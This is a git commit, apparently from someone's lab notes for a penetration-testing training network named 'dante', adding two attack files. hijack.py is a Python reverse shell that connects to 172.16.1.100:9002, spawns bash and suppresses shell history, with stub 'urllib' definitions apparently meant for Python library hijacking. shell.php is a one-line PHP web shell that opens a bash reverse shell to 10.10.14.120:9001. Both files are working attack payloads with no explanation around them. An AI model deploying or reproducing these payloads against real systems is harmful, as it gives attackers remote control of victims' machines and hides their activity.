88fcb454279e5026b47c9b7dc76808fed25023e6
pop <joshmerrill255@gmail.com>
2022-04-10 20:16:45 -0400

    dante

---
+++ dante/10/hijack.py
@@ -0,0 +1,28 @@
+import os
+import pty
+import socket
+
+lhost = "172.16.1.100"
+lport = 9002
+
+ZIP_DEFLATED = 0
+
+class urllib:
+    def close(*args):
+        return
+
+    def write(*args):
+        return
+
+    def __init__(self, *args):
+        return
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((lhost, lport))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+os.putenv("HISTFILE",'/dev/null')
+pty.spawn("/bin/bash")
+s.close()
+
---
+++ dante/100/shell.php
@@ -0,0 +1,2 @@
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.120/9001 0>&1'") ?>
+
